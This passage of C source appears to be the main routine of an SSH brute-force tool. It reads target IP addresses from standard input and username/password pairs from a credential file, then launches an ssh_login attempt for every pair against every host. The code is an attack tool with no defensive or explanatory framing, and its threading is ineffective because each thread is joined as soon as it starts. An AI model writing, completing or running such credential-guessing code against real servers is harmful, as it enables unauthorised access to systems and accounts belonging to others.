    char line[MAX_LINE_LEN];
    while (fgets(line, sizeof(line), stdin) && ip_count < MAX_IPS) {
        sscanf(line, "%15s", ip_list[ip_count]);
        ip_count++;
    }

    char usernames[MAX_CREDENTIALS][32];
    char passwords[MAX_CREDENTIALS][32];
    int cred_count = 0;

    FILE *fp = fopen(credential_file, "r");
    if (!fp) {
        perror("Error opening credential file");
        exit(1);
    }

    while (fgets(line, sizeof(line), fp) && cred_count < MAX_CREDENTIALS) {
        sscanf(line, "%31s %31s", usernames[cred_count], passwords[cred_count]);
        cred_count++;
    }
    fclose(fp);

    pthread_t threads[thread_count];
    ssh_cred creds[thread_count];

    for (int i = 0; i < ip_count; i++) {
        for (int j = 0; j < cred_count; j++) {
            creds[i % thread_count].ip = ip_list[i];
            creds[i % thread_count].username = usernames[j];
            creds[i % thread_count].password = passwords[j];

            pthread_create(&threads[i % thread_count], NULL, ssh_login, &creds[i % thread_count]);
            pthread_join(threads[i % thread_count], NULL);
        }
    }

    return 0;
}
